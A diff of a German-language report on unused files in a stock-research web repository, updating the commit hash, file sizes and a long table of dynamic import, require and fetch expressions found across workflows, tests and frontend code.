@@ -1,6 +1,6 @@
 # Ungenutzte Dateien – E7
 
-Analysierter Commit: `24552891ea135dcefa9a84cef5c48a227f447750`.
+Analysierter Commit: `a9eb89b609ba26dbf44ece5639ba9e5404ec0b45`.
 
 ## Methode und Grenzen
 
@@ -28,7 +28,7 @@ Größenvergleich gegen `9e2012b6f339fd6aef80ef5df7e6eb211f1ff683`; getrackte Da
 | worker-waker/ | 4 | 60308 | 60308 | Eigenes Cloudflare-Deployment und Workflow-Tests; behalten. |
 | landing/review/ | 37 | 8361739 | 8361739 | CI erwähnt den Review-Pfad; Live-404 genügt nicht; behalten. |
 | evidence/ | 54 | 1026077 | 1026077 | Audit-/Auslieferungsbelege und grundsätzlich im Pages-Build; behalten. |
-| scripts/ | 1824 | 28180314 | 28201170 | Workflow-/Test-/Registry-Aufrufe schützen; übrige Einträge unten unsicher. |
+| scripts/ | 1824 | 28180314 | 28201850 | Workflow-/Test-/Registry-Aufrufe schützen; übrige Einträge unten unsicher. |
 
 Live-Stichprobe: 2026-11-06T13:19:17.451215+00:00, https://research.visionuniverse.de. Keine vollständige Browser-Netzwerkaufzeichnung.
 
@@ -1085,7 +1085,7 @@ Ein Verzeichnisverweis oder CI-Pfadfilter beweist keinen ausgeführten Einzelauf
 | scripts/marketstack/tests/europe-marketstack-diagnostics-once.test.mjs | 8765 | Nur breite Kanten, z. B. app/README.md; Nutzung unklar; behalten. |
 | scripts/marketstack/tests/europe-xpar-identity-offline.test.mjs | 5105 | Nur breite Kanten, z. B. app/README.md; Nutzung unklar; behalten. |
 | scripts/mobile/tests/server.test.mjs | 1220 | Nur breite Kanten, z. B. app/README.md; Nutzung unklar; behalten. |
-| scripts/quality/tests/find-unused.test.mjs | 4341 | Nur breite Kanten, z. B. .github/workflows/quant-ci.yml; Nutzung unklar; behalten. |
+| scripts/quality/tests/find-unused.test.mjs | 4817 | Nur breite Kanten, z. B. .github/workflows/quant-ci.yml; Nutzung unklar; behalten. |
 | scripts/quant/__init__.py | 0 | Nur breite Kanten, z. B. .github/workflows/quant-ci.yml; Workflow-Schutz; Nutzung unklar; behalten. |
 | scripts/quant/audit-security-type-provenance.mjs | 8649 | Nur breite Kanten, z. B. .github/workflows/quant-ci.yml; Workflow-Schutz; Nutzung unklar; behalten. |
 | scripts/quant/build-sec-mapping-dossier.mjs | 7042 | Nur breite Kanten, z. B. .github/workflows/quant-ci.yml; Workflow-Schutz; Nutzung unklar; behalten. |
@@ -2686,2086 +2686,2087 @@ Ein Verzeichnisverweis oder CI-Pfadfilter beweist keinen ausgeführten Einzelauf
 
 ## Dynamik und ungelesene Quellen
 
-2076 dynamische/zusammengesetzte import/require/fetch-Ausdrücke gefunden; diese verhindern einen vollständigen statischen Nichtnutzungsbeweis.
+2077 dynamische/zusammengesetzte import/require/fetch-Ausdrücke gefunden; diese verhindern einen vollständigen statischen Nichtnutzungsbeweis.
 
 | Quelle | Ausdruck |
 |---|---|
-| .github/workflows/company-intelligence-profile-source.yml | fetch('https://research.visionuniverse.de/company-intelligence-delivery.json?profile='+Date.now(),{signal:AbortSignal.timeout(15000)}) |
-| .github/workflows/company-intelligence-universe-release.yml | fetch(root+'company-intelligence-delivery.json'+query),d=await r.json() |
-| .github/workflows/company-intelligence-universe-release.yml | fetch(root+'company-intelligence-refresh.json'+query)).json() |
-| .github/workflows/elliott-prospective-registry.yml | require("./'"$REG"'/HEAD.json") |
-| .github/workflows/elliott-prospective-registry.yml | require("./'"$REG"'/HEAD.json") |
-| .github/workflows/europe-discover-refresh.yml | require(process.argv[1]).run&#124;&#124;{} |
-| .github/workflows/freshness-monitor.yml | require(process.env.RUNNER_TEMP + "/pipeline-freshness.json") |
-| .github/workflows/fundamental-sec-freshness.yml | require(process.argv[1]) |
-| .github/workflows/fundamental-sec-freshness.yml | require(process.argv[1]).oldestPending &#124;&#124; "")' "$RUNNER_TEMP/freshness.json") |
-| .github/workflows/fundamental-sec-freshness.yml | require(process.argv[1]) |
-| .github/workflows/fundamental-sec-freshness.yml | require(process.argv[1]) |
-| .github/workflows/long-series.yml | require(process.argv[1]).affected.length)' "$RUNNER_TEMP/verify.json") |
-| .github/workflows/long-series.yml | require(process.argv[1]).affected.map(a => a.ticker).join(","))' "$RUNNER_TEMP/verify.json") |
-| .github/workflows/long-series.yml | require(process.argv[1]).affected.map(a => a.securityId).join(" "))' "$RUNNER_TEMP/verify.json") |
-| .github/workflows/market-data-refresh.yml | require(process.env.RUNNER_TEMP + "/total-return-repair.json") |
-| .github/workflows/monitor.yml | require("./quant/data/market/commercial/" + name + ".json") |
-| .github/workflows/product-intelligence-materialization.yml | require(process.env.RUNNER_TEMP+"/freshness-vorher.json") |
-| .github/workflows/product-intelligence-materialization.yml | require(process.env.RUNNER_TEMP+"/freshness-vorher.json") |
-| .github/workflows/quant-portfolio-research.yml | require(process.argv[1]) |
-| .github/workflows/security-master-weekly.yml | require(process.env.REPORT) |
-| .github/workflows/social-cloudflare.yml | require(process.cwd() + "/tmp/social/status.json") |
-| .github/workflows/social-cloudflare.yml | require(process.cwd() + "/tmp/social/status.json") |
-| .github/workflows/social-smoke-publish.yml | require(process.cwd() + "/tmp/smoke/status.json") |
-| .github/workflows/social-smoke-publish.yml | require(process.cwd() + "/tmp/smoke/status.json") |
-| .github/workflows/social-smoke-publish.yml | require(process.cwd() + "/tmp/smoke/status.json") |
-| .github/workflows/supertrader-sf8-candidates.yml | require(process.env.REPORT) |
-| .github/workflows/supertrader-sf8-candidates.yml | require(process.env.PUB + "/summary.json").asOf)') |
-| .github/workflows/supertrader-sf8-candidates.yml | require(process.env.RECORD) |
-| .github/workflows/supertrader-sf8-candidates.yml | require(process.env.RECORD) |
-| .github/workflows/technical-intelligence-build.yml | require("./'"$V3"'/build-inputs.json").fingerprint&#124;&#124;"")}catch(e){console.log("")}') |
-| .github/workflows/technical-intelligence-build.yml | require("./'"$V3"'/meta.json") |
-| .github/workflows/technical-intelligence-build.yml | require("./'"$V3"'/meta.json") |
-| .github/workflows/tiingo-scale.yml | require("./quant/data/market/scale/gate-" + process.env.GATE + ".json") |
-| .github/workflows/tiingo-scale.yml | require("./quant/data/market/scale/gate-"+process.env.GATE+".json").verdict)}catch(e){console.log("MISSING")}') |
-| .github/workflows/tiingo-scale.yml | require("./quant/data/market/scale/gate-"+process.env.GATE+".json") |
-| academy/shell/experience-shell.js | fetch(url) |
-| analysten/index.html | fetch(UNIVERSE_URL + suffix, opts).then(function(r){ return r.ok ? r.json() : { stocks: [] } |
-| analysten/index.html | fetch(RATINGS_URL + suffix, opts).then(function(r){ if(!r.ok) throw new Error("HTTP " + r.status) |
-| analysten/index.html | fetch(MARKET_URL + suffix, opts).then(function(r){ return r.ok ? r.json() : { symbols: {} } |
-| analysten/index.html | fetch(url,{cache:"default"}).then(function(r){ if(!r.ok) throw new Error("HTTP "+r.status) |
-| api/intraday.js | fetch(origin + "/" + path.replace(/^\/+/, ""), { |
-| app/scripts/gesture-bridge-browser.mjs | require(modules ? modules+'/playwright' : 'playwright') |
-| app/scripts/gesture-browser.mjs | require(deps ? deps+'/playwright' : 'playwright') |
-| app/www/js/api.js | fetch(...a)}) { |
-| app/www/js/auth.js | fetch(...a), now = Date.now}) { |
-| ask/app.js | fetch(ENDPOINT + '/v1/quota?client=' + encodeURIComponent(clientId()), { headers: authHeaders() }) |
-| ask/app.js | fetch(ENDPOINT + '/v1/ask', { method: 'POST', headers: authHeaders({ 'content-type': 'application/json' }), |
-| ask/app.js | fetch(path, { cache: 'default' }).then(function (r) { if (!r.ok) throw Error('HTTP ' + r.status) |
-| assets/vu-ui.js | fetch(LOGO_BASE + "index.json", { cache: "default" }).then(function (r) { return r.ok ? r.json() : {} |
-| core/tests/client.test.mjs | require(join(ROOT, "core", "client.js")) |
-| core/tests/europe-discover-known-invalid.test.mjs | import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) |
-| core/tests/europe-discover-refresh.test.mjs | import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) |
-| core/tests/europe-discover-schedule.test.mjs | import(join(root,'scripts/marketstack/europe-discover-refresh.mjs')) |
-| core/tests/golden-paths.test.mjs | require(join(ROOT, "core", "client.js")) |
-| core/tests/golden-paths.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/health.test.mjs | require(join(ROOT, "core", "health.js")) |
-| core/tests/health.test.mjs | require(join(ROOT, "quant", "engines", "realtime", "trading-session.js")) |
-| core/tests/identity-adoption.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/identity-adoption.test.mjs | require(join(ROOT, "quant", "engines", "company-master.js")) |
-| core/tests/identity.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/identity.test.mjs | require(join(ROOT, "quant", "engines", "company-master.js")) |
-| core/tests/portfolios.test.mjs | require(join(root, "assets/vu-ui.js")) |
-| core/tests/portfolios.test.mjs | require(join(root, "portfolios/portfolios.js")) |
-| core/tests/sf8-data-quality.test.mjs | require(join(ROOT, "core", "data-quality.js")) |
-| core/tests/sf8-data-quality.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/sf8-data-quality.test.mjs | require(join(ROOT, "quant", "engines", "published-close.js")) |
-| core/tests/shell-navigation.test.mjs | require(join(root, 'fundamental/engine/model.js')) |
-| core/tests/shell-navigation.test.mjs | require(join(root, 'technical/engine/model.js')) |
-| core/tests/state-gate.test.mjs | import(GATE) |
-| core/tests/state/supertrader-discover.test.mjs | require(join(ROOT, "core", "client.js")) |
-| core/tests/stock-address.test.mjs | require(join(ROOT, "core", "stock-address.js")) |
-| core/tests/stock-address.test.mjs | require(join(ROOT, "core", "stock-context.js")) |
-| core/tests/stock-availability.test.mjs | require(join(ROOT, "core", "stock-context.js")) |
-| core/tests/stock-context.test.mjs | require(join(ROOT, "core", "stock-context.js")) |
-| core/tests/stock-context.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/stock-navigator.test.mjs | require(join(ROOT, "core", "stock-context.js")) |
-| core/tests/stock-navigator.test.mjs | require(join(ROOT, "assets", "stock-navigator.js")) |
-| core/tests/supertrader-chain.test.mjs | import(CHAIN) |
-| core/tests/supertrader-chain.test.mjs | import(join(ROOT, "scripts", "ci", "pipeline-alarm.mjs")) |
-| core/tests/vu-chart.test.mjs | require(join(ROOT, "assets", "vu-chart.js")) |
-| core/tests/watchlist-button.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| core/tests/watchlist-button.test.mjs | require(join(ROOT, "assets", "watchlist-button.js")) |
-| dashboard/app-rebuild.js | fetch('/dashboard/' + path, { cache: 'no-store' }).then((r) => { if (!r.ok) throw new Error(path) |
-| dashboard/app.js | fetch(url).then(function(r){if(!r.ok)throw Error("Daten nicht verfügbar") |
-| dashboard/index_legacy_v63.html | fetch(url)})) |
-| dashboard/v2.js | fetch("/dashboard/"+(n==="universe"?"config/":"data/")+n+".json").then(r=>r.json()))).catch(()=>[]) |
-| discover/engines/europe-bootstrap.js | fetch(localURL(binding.url),{cache:'no-cache',credentials:'same-origin'}) |
-| discover/engines/europe-bootstrap.js | fetch(asset.path) |
-| discover/engines/europe-bootstrap.js | fetch(BASE+'manifest.json',{cache:'no-cache',credentials:'same-origin'}) |
-| discover/index.html | fetch() der Seite und wird genau diesem |
-| discover/tests/contract.test.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| discover/tests/einordnung.test.mjs | require(join(root, "discover", "engines", "einordnung.js")) |
-| discover/tests/einordnung.test.mjs | require(join(root, "discover", "engines", "unternehmen.js")) |
-| discover/tests/europe-product.test.mjs | require(process.env.CODEX_PRIMARY_RUNTIME_NODE_MODULES+'/playwright') |
-| discover/tests/high52w.test.mjs | require(join(root, "discover", "engines", "high52w.js")) |
-| discover/tests/im-blick-live.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| discover/tests/im-blick-nachtlauf.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| discover/tests/im-blick-nachtlauf.test.mjs | require(join(ROOT, "discover", "engines", "refresh-plan.js")) |
-| discover/tests/im-blick-nachtlauf.test.mjs | import(join(ROOT, "scripts", "ci", "pipeline-alarm.mjs")) |
-| discover/tests/im-blick-refresh.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| discover/tests/im-blick-refresh.test.mjs | require(join(ROOT, "discover", "engines", "refresh-plan.js")) |
-| discover/tests/im-blick-refresh.test.mjs | fetch() {} }) |
-| discover/tests/im-blick-refresh.test.mjs | fetch() {} }) |
-| discover/tests/indicators.test.mjs | require(join(root, "discover", "engines", "indicators.js")) |
-| discover/tests/klartext.test.mjs | require(join(root, "discover", "engines", "klartext.js")) |
-| discover/tests/klartext.test.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| discover/tests/lazy-loading.test.mjs | fetch() derselben Adresse bekommt die vorgeholte Antwort - genau einmal', async () => { |
-| discover/tests/price-rounding.test.mjs | require(join(root, "quant", "engines", "published-close.js")) |
-| discover/tests/pwa-shell.test.mjs | fetch({request: req, respondWith: x => { r = x |
-| discover/tests/realtime.test.mjs | require(join(root, "discover", "engines", "realtime-source.js")) |
-| discover/tests/realtime.test.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| discover/tests/scoring.test.mjs | require(join(root, "discover", "engines", "scoring.js")) |
-| discover/tests/scoring.test.mjs | require(join(root, "discover", "methodology", "discover-v1.json")) |
-| discover/tests/technical-intelligence.test.mjs | require(join(root, "discover", "engines", "technical-intelligence.js")) |
-| discover/tests/technical-intelligence.test.mjs | require(join(root, "discover", "engines", "contract.js")) |
-| discover/tests/watchlist-coupling.test.mjs | require(join(ROOT, "core", "identity.js")) |
-| discover/tests/watchlist-coupling.test.mjs | require(join(ROOT, "assets", "watchlist-button.js")) |
-| discover/ui/featured.js | fetch(url,{cache:'no-cache'}).then(function(r){if(!r.ok)throw new Error('HTTP '+r.status) |
-| discover/ui/lazy.js | fetch(src, { method: 'HEAD', cache: 'no-store', credentials: 'same-origin', signal: ctl ? ctl.signal : undefined }) |
-| discover/ui/logos.js | fetch(BASE + "index.json", { cache: "default", priority: "low" }) |
-| discover/ui/logos.js | fetch(BASE + "credits.json", { cache: "default" }) |
-| discover/ui/series-loader.js | fetch(path, { cache: "default" }).then(function (r) { |
-| docs/VU_MARKETS_3_CONSUMER_INTELLIGENCE.md | fetch(` und Providernamen in `market-intelligence.js`. |
-| docs/VU_QUANT_2_FRONTEND_TRANSFORMATION.md | fetch()` |
-| docs/VU_TWELVE_DATA_ADAPTER.md | fetch(url, init) |
-| docs/accounts/ACCOUNTS_AND_SUBSCRIPTIONS.md | fetch(credentials:"include", X-VU-Client: web) – hält KEIN Token |
-| docs/charts/CHART_STANDARD.md | fetch(path, { cache: 'no-cache' }).then(function (r) { if (!r.ok) throw 0 |
-| docs/design/VU3_UI_SYSTEM.md | fetch(…).then(…), base: previousClose } |
-| docs/design/redesign-2027/tools/series.js | require(path.resolve(__dirname, '../../../../core/identity.js')) |
-| docs/quant-recovery/v8/validation-f10-checkpoint.json | require(\"node:fs\"),path=require(\"node:path\") |
-| elliott/app.js | fetch(path, { credentials: "same-origin" }).then(function (res) { |
-| elliott/index.html | fetch(g.getAttribute("data-content"),{credentials:"same-origin"}).then(function(r){return r.text() |
-| elliott/spark.js | fetch("/quant/data/market/discover-series/" + id + ".json", { credentials: "same-origin" }) |
-| fundamental/app.js | fetch(path, { credentials: 'same-origin' }).then(function (r) { if (!r.ok) { var e = new Error('HTTP ' + r.status) |
-| fundamental/app.js | fetch(path, { credentials: 'same-origin' }).then(function (r) { |
-| guide/app.js | fetch('/dashboard/' + path, { cache: 'no-store' }).then((r) => { if (!r.ok) throw new Error(path) |
-| hedgefonds/app.js | fetch(url, { cache: "no-cache" }).then(function (r) { |
-| hedgefonds/app.js | fetch(url, { cache: "no-cache" }).then(function (r) { |
-| konto/watchlist.js | fetch(path, {cache: 'default', credentials: 'omit'}).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) |
-| landing/scripts/check-live.mjs | fetch(new URL('assets/home/home.css',url)) |
-| landing/scripts/cloudflare-audit.mjs | fetch('https://api.cloudflare.com/client/v4'+path,{headers:{Authorization:'Bearer '+token},signal:AbortSignal.timeout(20000)}) |
-| landing/scripts/cloudflare-prepare.mjs | fetch('https://api.cloudflare.com/client/v4'+path,{method,headers:{Authorization:'Bearer '+token},signal:AbortSignal.timeout(30000)}) |
-| landing/scripts/compare-research.mjs | import(pathToFileURL(resolve(temporary,'landing/scripts/build.mjs'))) |
-| landing/server/newsletter.mjs | fetch(request,env){ |
-| landing/server/newsletter.mjs | fetch(request) |
-| landing/tests/cloudflare.test.mjs | import(${JSON.stringify(pathToFileURL(resolve(root,'scripts/cloudflare-audit.mjs')).href)}) |
-| landing/tests/cloudflare.test.mjs | import(${JSON.stringify(pathToFileURL(resolve(root,'scripts/cloudflare-prepare.mjs')).href)}) |
-| landing/tests/edge-runtime.mjs | fetch(origin+'/ready')).status===200 |
-| landing/tests/edge-runtime.mjs | fetch(origin+'/legacy').then(r=>r.json()),{rejected:true}) |
-| landing/tests/edge-runtime.mjs | fetch(origin+'/api/newsletter/subscribe',{method:'POST',headers:{Origin:'https://www.visionuniverse.de','Content-Type':'application/json','CF-Connecting-IP':ip},body: |
-| landing/tests/edge-runtime.mjs | fetch(origin+'/stats').then(r=>r.json()),{attempted:2,accepted:1,unexpected:0,validBody:true}) |
-| landing/tests/edge-runtime/fixture.mjs | fetch(request){ |
-| landing/tests/edge-runtime/mock.mjs | fetch(request){ |
-| macro/app.js | fetch(path).then(function (r) { if (!r.ok) throw new Error(path + " " + r.status) |
-| mein-dashboard/dashboard.js | fetch(path, {cache: 'default', credentials: 'omit'}).then(function (r) { if (!r.ok) throw new Error('HTTP_' + r.status) |
-| news/news.js | fetch(path, { cache: 'no-store' }) |
-| portfolios/portfolios.js | fetch(path, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(String(r.status)) |
-| portfolios/portfolios.js | fetch(path, { cache: "no-cache" }).then(function (r) { if (!r.ok &#124;&#124; typeof root.DecompressionStream !== "function") throw new Error("GZ") |
-| providers/sec/adapter.js | require(path.join(ENGINES, "capabilities.js")) |
-| providers/sec/adapter.js | require(path.join(ENGINES, "provider.js")) |
-| providers/sec/adapter.js | require(path.join(ENGINES, "schema.js")) |
-| providers/tiingo/adapter.js | require(path.join(engines, "provider.js")) |
-| providers/tiingo/adapter.js | require(path.join(engines, "schema.js")) |
-| providers/tiingo/adapter.js | require(path.join(engines, "capabilities.js")) |
-| providers/tiingo/adapter.js | require(path.join(engines, "market-client.js")) |
-| providers/twelve-data/adapter.js | require(path.join(ENGINES, "capabilities.js")) |
-| providers/twelve-data/adapter.js | require(path.join(ENGINES, "market-client.js")) |
-| providers/twelve-data/adapter.js | require(path.join(ENGINES, "provider.js")) |
-| providers/twelve-data/adapter.js | require(path.join(ENGINES, "schema.js")) |
-| quant/api/product-services.js | fetch(path,{credentials:'omit'}) |
-| quant/api/technical-intelligence-workspace.js | fetch(path, { credentials: "omit" }).then(function (res) { |
-| quant/app/view-model.js | require() - die Tests pruefen jede Aussage gegen echte |
-| quant/engines/fx/bootstrap.js | fetch(url, { credentials: "same-origin" }).then(function (res) { |
-| quant/engines/instrument-directory.js | fetch(path).then(function (res) { |
-| quant/engines/multi-asset/instrument-catalog.js | require(path.join(__dirname, "..", "..", "config", "multi-asset-instruments.json")) |
-| quant/engines/multi-asset/instrument-catalog.js | require(path.join(__dirname, "..", "..", "config", "multi-asset.json")) |
-| quant/engines/technical/technical-analysis.js | require(name) : global.VUTechnical[key] |
-| quant/engines/technical/technical-analysis.js | require(path) |
-| quant/engines/technical/ti/engine.js | require(path) : global.VUTechnical[key] |
-| quant/index.html | fetch(p,{cache:"no-cache"}) |
-| quant/musterdepots/depots.js | fetch(DATA, { cache: "no-cache" }).then(function (r) { if (!r.ok) throw new Error(r.status) |
-| quant/tests/analysis-lag.test.mjs | require() AUSGEFUEHRT statt als Quelltextausschnitt gelesen |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/api/product-services.js")) |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/engines/display-policy.js")) |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/engines/query.js")) |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/engines/realtime/freshness.js")) |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/config/market-calendar.json")) |
-| quant/tests/analysis-lag.test.mjs | require(join(root, "quant/app/view-model.js")) |
-| quant/tests/assignment-change.test.mjs | require() ausgefuehrt) und die Flaechen in quant/app/*.js. Sie schlagen |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/engines/strategy-match.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/engines/rule-contract.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/api/alert-rule-contract.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/engines/query.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/api/product-services.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/engines/display-policy.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/engines/query.js")) |
-| quant/tests/assignment-change.test.mjs | require(join(root, "quant/app/view-model.js")) |
-| quant/tests/backtest-demo-freshness.test.mjs | require(SCRIPT) |
-| quant/tests/classify-rejections-cli.test.mjs | require(join(root, "quant", "engines", "market-store.js")) |
-| quant/tests/company-name-coverage.test.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
-| quant/tests/company-name-coverage.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/company-name-coverage.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/company-name-coverage.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/coverage-metrics.test.mjs | require(join(root, "quant", "engines", "coverage-metrics.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "fx-rates.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "fx-freshness.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "currency-registry.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "currency-class.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "currency-engine.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "money-format.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "currency-preference.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "currency-contract.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "fx-capability.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "fx-realtime-state.js")) |
-| quant/tests/currency-fx-matrix.test.mjs | require(join(FX, "fx-provider-registry.js")) |
-| quant/tests/daily-lifecycle-health.test.mjs | require(join(root, "quant", "engines", "daily-lifecycle-health.js")) |
-| quant/tests/debt-instrument-classification.test.mjs | require(join(root, "quant", "engines", "us-security-master.js")) |
-| quant/tests/debt-instrument-classification.test.mjs | require(join(root, "quant", "engines", "company-master.js")) |
-| quant/tests/delivery-watchdog.test.mjs | require(join(root, "quant", "engines", "realtime", "delivery-watchdog.js")) |
-| quant/tests/elliott-home.test.mjs | require(join(ROOT, "elliott/engine/home-model.js")) |
-| quant/tests/elliott-home.test.mjs | import(new URL("../../scripts/technical/elliott-home/home.mjs", import.meta.url)) |
-| quant/tests/elliott-home.test.mjs | fetch("/quant/index.html"') < html.indexOf('l.href="/quant/data/technical-intelligence/v3/elliott-home.json"'), "Stack-Vorladen nur im Deep-Link-Zweig") |
-| quant/tests/elliott-home.test.mjs | import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/register.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/product-view.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/verify.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/ledger.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-product.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/build-technical-intelligence.mjs")) |
-| quant/tests/elliott-registry-product-view.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-projection.mjs"))).PROJECTION_VERSION |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-setups/setup-library.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/ledger.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/register.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/verify.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/evaluate-registry.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/elliott-registry/product-view.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/lib/ti-data.mjs")) |
-| quant/tests/elliott-registry.test.mjs | import(join(ROOT, "scripts/technical/hsab/lib/replay-core.mjs")) |
-| quant/tests/elliott-registry.test.mjs | require(join(ROOT, "quant/engines/technical/elliott/elliott-v3.js")) |
-| quant/tests/factor-product-projection.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/factor-product-projection.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/factor-product-projection.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/factor-product-projection.test.mjs | require(join(ROOT, "quant/engines/factor-product-projection.js")) |
-| quant/tests/factor-product-projection.test.mjs | require(join(ROOT, "quant/engines/company-master.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(). Die Engine-Tests (2) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/engines/historical-cases.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/engines/pattern-research.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/app/view-model.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")), queryEngine: require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/frontend-transformation.test.mjs | require(join(ROOT, "quant/api/screener-workspace.js")) |
-| quant/tests/fx-bootstrap-preload.test.mjs | fetch(url) { calls.push(url) |
-| quant/tests/helpers/weekly-portfolio-fixtures.mjs | require(root + '/quant/engines/research-weekly-loader.cjs'), B = require(root + '/quant/engines/weekly-benchmark.cjs'), C = require(root + '/quant/engines/research-cont |
-| quant/tests/history-store.test.mjs | require(join(root, "quant", "engines", "bar-codec.js")) |
-| quant/tests/history-store.test.mjs | require(join(root, "quant", "engines", "history-store.js")) |
-| quant/tests/history-store.test.mjs | require(join(root, "quant", "engines", "zero-cost-guard.js")) |
-| quant/tests/history-store.test.mjs | import(join(root, "scripts", "market", "storage", "fs-driver.mjs")) |
-| quant/tests/history-store.test.mjs | import(join(root, "scripts", "market", "storage", "s3-driver.mjs")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/engines/intelligence-brief.js")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/engines/factor-evidence.js")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/engines/change-engine.js")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/intelligence-brief.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/internal-links.test.mjs | import(new URL("../../scripts/vu2/build-release.mjs", import.meta.url)) |
-| quant/tests/intraday-delivery-contract.test.mjs | require(join(root, "quant", "engines", "realtime", "intraday-snapshot.js")) |
-| quant/tests/intraday-delivery-contract.test.mjs | require(join(root, "providers", "tiingo", "adapter.js")) |
-| quant/tests/intraday-scope.test.mjs | require(join(root, "quant", "engines", "realtime", "intraday-scope.js")) |
-| quant/tests/journey-shape.test.mjs | require(join(ROOT, "quant/engines/journey-shape.js")) |
-| quant/tests/journey-shape.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/journey-shape.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/journey-shape.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/last-price-from-series.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/last-price-from-series.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/last-price-from-series.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/launch-gates.test.mjs | require(join(ROOT, "quant/api/product-services.js")) |
-| quant/tests/launch-gates.test.mjs | require(join(ROOT, "quant/engines/display-policy.js")) |
-| quant/tests/launch-gates.test.mjs | require(join(ROOT, "quant/engines/query.js")) |
-| quant/tests/launch-gates.test.mjs | require(join(ROOT, "quant/engines/instrument-classification.js")) |
